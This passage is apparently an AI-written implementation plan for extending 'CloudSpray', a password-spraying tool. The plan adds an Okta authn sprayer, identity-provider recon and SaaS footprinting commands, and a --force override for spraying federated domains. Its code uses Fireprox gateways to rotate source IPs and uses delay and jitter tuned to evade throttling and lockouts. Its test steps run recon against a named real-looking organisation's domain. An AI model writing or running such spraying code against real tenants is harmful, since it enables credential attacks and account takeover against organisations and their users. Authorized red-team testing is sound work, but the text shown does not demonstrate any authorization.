            client_id="okta-signin-widget",
            endpoint=self._authn_url,
            user_agent=user_agent,
            result=result,
            error_code=error_code,
            timestamp=datetime.now(timezone.utc),
            proxy_used=proxy_url,
        )

    def _classify_response(self, status_code: int, data: dict) -> AuthResult:
        """Map an Okta authn response to an AuthResult.

        Args:
            status_code: HTTP status code from Okta.
            data: Parsed JSON response body.

        Returns:
            Classified AuthResult.
        """
        if status_code == 200:
            status = data.get("status", "")
            return _OKTA_STATUS_MAP.get(status, AuthResult.UNKNOWN_ERROR)

        if status_code in (401, 403):
            error_code = data.get("errorCode", "")
            return _OKTA_ERROR_MAP.get(error_code, AuthResult.INVALID_PASSWORD)

        if status_code == 429:
            return AuthResult.RATE_LIMITED

        return AuthResult.UNKNOWN_ERROR
```

**Step 4: Run tests to verify they pass**

Run: `cd /c/Users/JasonDowney/Code/cloudspray && python -m pytest tests/spray/test_okta_auth.py -v`
Expected: All tests PASS

**Step 5: Commit**

```bash
git add cloudspray/cloudspray/spray/okta_auth.py cloudspray/tests/spray/
git commit -m "add Okta authenticator with /api/v1/authn response classification"
```

---

## Task 5: Add `recon` CLI command

**Files:**
- Modify: `cloudspray/cloudspray/cli.py` (add recon command after format_cmd, around line 604)

**Step 1: Add the recon command**

Add the following command to `cli.py` after the `format_cmd` function (after line 603):

```python
@cli.command("recon")
@click.option("-d", "--domain", required=True, help="Target domain to investigate.")
@click.pass_context
def recon_cmd(ctx, domain):
    """Discover the identity provider and tenant info for a domain.

    Checks Azure AD tenant existence, federation status, DNS TXT records
    for DirectFedAuthUrl, MX records, and autodiscover CNAME. Tells you
    whether to spray Azure AD or use okta-spray instead.
    """
    reporter = ctx.obj["reporter"]

    reporter.banner()

    from cloudspray.recon import ReconDiscovery

    disco = ReconDiscovery(domain)
    result = disco.run(reporter)

    # Display results
    reporter.info("")
    reporter.info("=== Recon Results ===")
    reporter.info(f"Domain: {result.domain}")

    if result.tenant_id:
        reporter.info(f"Tenant ID: {result.tenant_id}")
    else:
        reporter.info("Tenant: No Azure AD tenant found")

    if result.namespace_type:
        reporter.info(f"Namespace: {result.namespace_type}")
    if result.federation_brand:
        reporter.info(f"Federation Brand: {result.federation_brand}")

    if result.idp_name:
        reporter.info(f"Identity Provider: {result.idp_name} ({result.idp_host})")
        if result.federation_url:
            reporter.info(f"Federation URL: {result.federation_url}")
    else:
        reporter.info("Identity Provider: None detected (likely Azure AD native)")

    if result.mail_provider:
        reporter.info(f"Mail: {result.mail_provider} ({result.mail_host})")
    if result.autodiscover_cname:
        reporter.info(f"Autodiscover: {result.autodiscover_cname}")
        if result.has_m365:
            reporter.info("M365 Services: In use (autodiscover points to outlook.com)")

    # Federation warning
    if result.idp_name and result.idp_name != "Unknown":
        reporter.info("")
        reporter.error(
            f"WARNING: This domain federates to {result.idp_name} ({result.idp_host})"
        )
        reporter.error("Azure AD ROPC spray will likely fail for federated users.")
        if result.idp_name == "Okta":
            reporter.info("Use 'okta-spray' command instead.")
            if result.idp_host:
                reporter.info(f"  cloudspray.py okta-spray --okta-url https://{result.idp_host} -d {domain} -u users.txt -p passwords.txt")
        else:
            reporter.info(f"This IdP ({result.idp_name}) is not yet supported for spraying.")
            reporter.info("Use --force with spray/enum to attempt anyway.")
```

**Step 2: Test manually**

Run: `cd /c/Users/JasonDowney/Code/cloudspray && python -m cloudspray.cli recon -d onelineage.com`
Expected: Should show tenant info, federation to Okta, MX records, etc.

**Step 3: Commit**

```bash
git add cloudspray/cloudspray/cli.py
git commit -m "add recon command for IdP discovery and federation detection"
```

---

## Task 6: Add `okta-spray` CLI command

**Files:**
- Modify: `cloudspray/cloudspray/cli.py` (add okta-spray command after recon_cmd)

**Step 1: Add the okta-spray command**

Add after the `recon_cmd` function:

```python
@cli.command("okta-spray")
@click.option("-d", "--domain", required=True, help="Target domain (for email normalization).")
@click.option(
    "-u", "--users", required=True,
    type=click.Path(exists=True),
    help="Path to user list file.",
)
@click.option(
    "-p", "--passwords",
    type=click.Path(exists=True),
    default=None,
    cls=MutuallyExclusive,
    mutually_exclusive=["password"],
    help="Path to password list file.",
)
@click.option(
    "-P", "--password",
    default=None,
    cls=MutuallyExclusive,
    mutually_exclusive=["passwords"],
    help="Single password string.",
)
@click.option("--okta-url", default=None, help="Okta org URL (e.g. https://lineage.okta.com). Auto-discovered if omitted.")
@click.option("--delay", type=click.IntRange(min=0), default=None, help="Seconds between attempts per user (default 60).")
@click.option("--jitter", type=click.IntRange(min=0), default=None, help="Random jitter range in seconds (default 15).")
@click.option("--lockout-threshold", type=click.IntRange(min=1), default=None, help="Hard stop after N consecutive lockouts.")
@click.option("--resume", is_flag=True, default=False, help="Resume from database state.")
@click.pass_context
def okta_spray_cmd(ctx, domain, users, passwords, password, okta_url, delay, jitter,
                   lockout_threshold, resume):
    """Spray passwords against an Okta organization.

    Dedicated Okta sprayer with conservative defaults tuned for Okta's
    aggressive throttling. Uses the /api/v1/authn endpoint directly.

    The Okta URL is auto-discovered from DNS TXT records if --okta-url
    is not specified. Falls back to error if discovery fails.
    """
    cfg = ctx.obj["config"]
    reporter = ctx.obj["reporter"]

    reporter.banner()

    if not passwords and not password:
        reporter.error("Provide either -p/--passwords (file) or -P/--password (single).")
        raise SystemExit(1)

    # Resolve Okta host
    okta_host = None
    if okta_url:
        # Strip protocol and trailing slashes
        from urllib.parse import urlparse
        parsed = urlparse(okta_url if "://" in okta_url else f"https://{okta_url}")
        okta_host = parsed.hostname
    else:
        # Auto-discover from DNS
        reporter.info(f"Auto-discovering Okta URL for {domain}...")
        from cloudspray.recon import ReconDiscovery
        disco = ReconDiscovery(domain)
        _, idp_host, _ = disco._parse_federation_from_txt()
        if idp_host and "okta.com" in idp_host:
            okta_host = idp_host
            reporter.info(f"Found Okta: {okta_host}")
        else:
            reporter.error("Could not auto-discover Okta URL from DNS TXT records.")
            reporter.error("Use --okta-url to specify it directly.")
            raise SystemExit(1)

    # Okta-tuned defaults: slower than Azure
    if delay is not None:
        cfg.spray.delay = delay
    else:
        cfg.spray.delay = 60

    if jitter is not None:
        cfg.spray.jitter = jitter
    else:
        cfg.spray.jitter = 15

    if lockout_threshold is not None:
        cfg.spray.lockout_threshold = lockout_threshold

    # Okta rate limit back-off is 120s (double Azure's 60s)
    cfg.spray.lockout_cooldown = 1800

    from cloudspray.spray.okta_auth import OktaAuthenticator
    from cloudspray.spray.engine import SprayEngine
    from cloudspray.utils import read_userlist, read_password_list, normalize_email

    userlist = [normalize_email(u, domain) for u in read_userlist(users)]
    if passwords:
        passlist = read_password_list(passwords)
    else:
        passlist = [password]

    # Build Fireprox session targeting the Okta host
    proxy_manager, proxy_session = _build_fireprox_session(cfg, okta_host, reporter)

    try:
        with StateDB(ctx.obj["db_path"]) as db:
            reporter.info(f"Okta spray starting: {okta_host}")
            reporter.info(f"User list: {users} ({len(userlist)} entries)")
            reporter.info(
                f"Delay={cfg.spray.delay}s, Jitter={cfg.spray.jitter}s "
                f"(Okta conservative defaults)"
            )
            authenticator = OktaAuthenticator(okta_host, proxy_session=proxy_session)
            engine = SprayEngine(cfg, db, authenticator, reporter)
            engine.run(userlist, passlist, resume=resume)
    except (KeyboardInterrupt, SystemExit):
        raise
    except Exception as exc:
        reporter.error(f"Okta spray failed: {exc}")
        raise SystemExit(1) from exc
    finally:
        if proxy_manager is not None:
            reporter.info("Tearing down Fireprox gateways")
            proxy_manager.teardown_all()
```

**Important:** You also need to add the `StateDB` import at the top of the okta_spray_cmd function body since it's used inside the `with` block. Add it near the other imports:

```python
    from cloudspray.state.db import StateDB
```

Wait -- `StateDB` is already imported via `ctx.obj["db_path"]` being used with `StateDB(...)`. Looking at the existing `spray_cmd`, it imports `StateDB` from the module-level import at the top... Actually no, looking at the code, `StateDB` is imported at the module level in `cli.py` at line 13 via `from cloudspray.state.db import StateDB`. So it's already available -- no additional import needed.

**Step 2: Test manually**

Run: `cd /c/Users/JasonDowney/Code/cloudspray && python -m cloudspray.cli okta-spray --help`
Expected: Shows okta-spray help with all options.

**Step 3: Commit**

```bash
git add cloudspray/cloudspray/cli.py
git commit -m "add okta-spray command with auto-discovery and conservative defaults"
```

---

## Task 7: Add `footprint` CLI command

**Files:**
- Modify: `cloudspray/cloudspray/cli.py` (add footprint command after okta_spray_cmd)

**Step 1: Add the footprint command**

Add after the `okta_spray_cmd` function:

```python
@cli.command("footprint")
@click.option("-d", "--domain", required=True, help="Target domain to footprint.")
@click.pass_context
def footprint_cmd(ctx, domain):
    """Full DNS-based SaaS intelligence dump for a domain.

    Analyzes TXT, MX, SPF, and DMARC records to identify every SaaS
    service the organization uses. Useful for attack surface mapping
    during authorized penetration tests.
    """
    reporter = ctx.obj["reporter"]

    reporter.banner()

    from cloudspray.recon import SaaSFootprinter, ReconDiscovery

    # Run recon first for IdP info
    disco = ReconDiscovery(domain)
    recon_result = disco.run(reporter)

    # Run footprint
    fp = SaaSFootprinter(domain)
    result = fp.run(reporter)

    # Display results
    reporter.info("")
    reporter.info(f"=== Footprint: {domain} ===")

    # Mail section
    reporter.info("")
    reporter.info("--- Mail ---")
    if result.mail_provider:
        reporter.info(f"MX: {result.mail_provider} ({result.mail_host})")
    else:
        reporter.info("MX: No MX records found")
    if result.spf_services:
        reporter.info(f"SPF: {', '.join(result.spf_services)}")
    if result.spf_includes:
        for inc in result.spf_includes:
            reporter.debug(f"  include:{inc}")
    if result.dmarc_policy:
        reporter.info(f"DMARC: {result.dmarc_policy}")
        if result.dmarc_record:
            reporter.debug(f"  {result.dmarc_record}")

    # Identity section
    reporter.info("")
    reporter.info("--- Identity ---")
    if recon_result.tenant_id:
        reporter.info(f"Azure AD: Tenant verified (ID: {recon_result.tenant_id})")
    else:
        reporter.info("Azure AD: No tenant found")
    if recon_result.idp_name:
        reporter.info(f"IdP: {recon_result.idp_name} ({recon_result.idp_host})")
    if recon_result.namespace_type:
        reporter.info(f"Namespace: {recon_result.namespace_type}")

    # SaaS section
    reporter.info("")
    reporter.info("--- SaaS Footprint ---")
    if result.saas_services:
        reporter.info(", ".join(result.saas_services))
    else:
        reporter.info("No SaaS services detected in TXT records")
```

**Step 2: Test manually**

Run: `cd /c/Users/JasonDowney/Code/cloudspray && python -m cloudspray.cli footprint -d onelineage.com`
Expected: Shows mail, identity, and SaaS footprint sections with real data.

**Step 3: Commit**

```bash
git add cloudspray/cloudspray/cli.py
git commit -m "add footprint command for SaaS attack surface mapping"
```

---

## Task 8: Add federation warning to spray and enum commands

**Files:**
- Modify: `cloudspray/cloudspray/cli.py`
  - Add `--force` flag to `spray_cmd` and `enum_cmd`
  - Add federation check inside `_discover_tenant()` or right after it in both commands

**Step 1: Add the `_check_federation()` helper**

Add this function after `_discover_tenant()` (around line 133):

```python
def _check_federation(domain: str, reporter: ConsoleReporter, force: bool) -> None:
    """Check if a domain federates to an external IdP and warn the user.

    Called by spray and enum commands after tenant discovery. If federation
    is detected and --force was not passed, the command aborts with guidance.

    Args:
        domain: Validated target domain.
        reporter: Console reporter for output.
        force: If True, print warning but continue. If False, abort.
    """
    from cloudspray.recon.discovery import ReconDiscovery

    disco = ReconDiscovery(domain)
    idp_name, idp_host, fed_url = disco._parse_federation_from_txt()

    if not idp_name:
        return

    reporter.info("")
    reporter.error(
        f"WARNING: {domain} federates authentication to {idp_name} ({idp_host})"
    )
    reporter.error(
        "Azure AD spray/enum will likely return user_not_found for all federated users."
    )
    reporter.info("")
    reporter.info("Options:")
    if idp_name == "Okta":
        reporter.info(f"  - Use 'okta-spray' command instead")
    reporter.info("  - Run 'recon' to see full IdP details")
    reporter.info("  - Pass --force to proceed anyway")

    if not force:
        reporter.info("")
        reporter.error("Aborting. Use --force to override.")
        raise SystemExit(1)

    reporter.info("")
    reporter.info("--force passed, proceeding despite federation warning.")
```

**Step 2: Add --force to enum_cmd**

Add this option to `enum_cmd` (after the `--teams-pass` option, before `@click.pass_context`):

```python
@click.option("--force", is_flag=True, default=False, help="Proceed even if domain federates to external IdP.")
```

Update the `enum_cmd` function signature to include `force`:

```python
def enum_cmd(ctx, domain, users, method, output, teams_user, teams_pass, force):
```

Add the federation check right after `domain = _discover_tenant(domain, reporter)` (line 227):

```python
    _check_federation(domain, reporter, force)
```

**Step 3: Add --force to spray_cmd**

Add this option to `spray_cmd` (after `--resume`, before `@click.pass_context`):

```python
@click.option("--force", is_flag=True, default=False, help="Proceed even if domain federates to external IdP.")
```

Update the `spray_cmd` function signature to include `force`:

```python
def spray_cmd(ctx, domain, users, passwords, password, delay, jitter,
              lockout_threshold, lockout_cooldown, shuffle, resume, force):
```

Add the federation check right after `domain = _discover_tenant(domain, reporter)` (line 342):

```python
    _check_federation(domain, reporter, force)
```

**Step 4: Test manually**

Run: `cd /c/Users/JasonDowney/Code/cloudspray && python -m cloudspray.cli spray --help`
Expected: Shows `--force` option in help.

Run: `cd /c/Users/JasonDowney/Code/cloudspray && python -m cloudspray.cli enum --help`
Expected: Shows `--force` option in help.

**Step 5: Commit**

```bash
git add cloudspray/cloudspray/cli.py
git commit -m "add federation warning to spray/enum with --force override"
```

---

## Task 9: Update recon __init__.py exports and final integration test

**Files:**
- Modify: `cloudspray/cloudspray/recon/__init__.py` (update to match actual class names)
- Create: `cloudspray/tests/test_cli_commands.py` (smoke test that all commands register)

**Step 1: Verify recon __init__.py exports are correct**

Read `cloudspray/cloudspray/recon/__init__.py` and ensure it matches:

```python
"""IdP discovery and SaaS footprinting via DNS reconnaissance."""

from cloudspray.recon.discovery import ReconDiscovery
from cloudspray.recon.footprint import SaaSFootprinter

__all__ = ["ReconDiscovery", "SaaSFootprinter"]
```

**Step 2: Write CLI smoke test**

`cloudspray/tests/test_cli_commands.py`:
```python
"""Smoke tests verifying all CLI commands are registered."""

from click.testing import CliRunner

from cloudspray.cli import cli


def test_recon_command_exists():
    runner = CliRunner()
    result = runner.invoke(cli, ["recon", "--help"])
    assert result.exit_code == 0
    assert "identity provider" in result.output.lower() or "discover" in result.output.lower()


def test_okta_spray_command_exists():
    runner = CliRunner()
    result = runner.invoke(cli, ["okta-spray", "--help"])
    assert result.exit_code == 0
    assert "okta" in result.output.lower()


def test_footprint_command_exists():
    runner = CliRunner()
    result = runner.invoke(cli, ["footprint", "--help"])
    assert result.exit_code == 0
    assert "saas" in result.output.lower() or "dns" in result.output.lower()


def test_spray_has_force_flag():
    runner = CliRunner()
    result = runner.invoke(cli, ["spray", "--help"])
    assert result.exit_code == 0
    assert "--force" in result.output


def test_enum_has_force_flag():
    runner = CliRunner()
    result = runner.invoke(cli, ["enum", "--help"])
    assert result.exit_code == 0
    assert "--force" in result.output
```

**Step 3: Run all tests**

Run: `cd /c/Users/JasonDowney/Code/cloudspray && python -m pytest tests/ -v`
Expected: All tests PASS

**Step 4: Commit**

```bash
git add cloudspray/cloudspray/recon/__init__.py cloudspray/tests/test_cli_commands.py
git commit -m "add CLI smoke tests and verify all commands register correctly"
```

---

## Task 10: Push to GitHub

**Step 1: Run full test suite one more time**

Run: `cd /c/Users/JasonDowney/Code/cloudspray && python -m pytest tests/ -v`
Expected: All tests PASS

**Step 2: Push the cloudspray subtree to GitHub**

```bash
cd /c/Users/JasonDowney/Code
git add cloudspray/
git commit -m "add Okta spraying, IdP recon, and SaaS footprinting to CloudSpray"
git subtree split --prefix=cloudspray -b cloudspray-push
git push origin cloudspray-push:jasondev
git branch -D cloudspray-push
```

Then merge to main via GitHub API if needed (same pattern as previous pushes).

---

## Summary of new files

| File | Purpose |
|------|---------|
| `cloudspray/cloudspray/recon/__init__.py` | Package exports |
| `cloudspray/cloudspray/recon/discovery.py` | `ReconDiscovery`: IdP detection, tenant check, DNS queries |
| `cloudspray/cloudspray/recon/footprint.py` | `SaaSFootprinter`: TXT/MX/SPF/DMARC parsing for SaaS mapping |
| `cloudspray/cloudspray/spray/okta_auth.py` | `OktaAuthenticator`: Okta /api/v1/authn sprayer |
| `cloudspray/tests/__init__.py` | Test package |
| `cloudspray/tests/recon/__init__.py` | Recon test package |
| `cloudspray/tests/recon/test_discovery.py` | Tests for ReconDiscovery |
| `cloudspray/tests/recon/test_footprint.py` | Tests for SaaSFootprinter |
| `cloudspray/tests/spray/__init__.py` | Spray test package |
| `cloudspray/tests/spray/test_okta_auth.py` | Tests for OktaAuthenticator |
| `cloudspray/tests/test_cli_commands.py` | CLI smoke tests |

## Modified files

| File | Change |
|------|--------|
| `cloudspray/requirements.txt` | Add `dnspython>=2.4.0` |
| `cloudspray/cloudspray/cli.py` | Add `recon`, `okta-spray`, `footprint` commands; add `--force` to `spray`/`enum`; add `_check_federation()` helper |
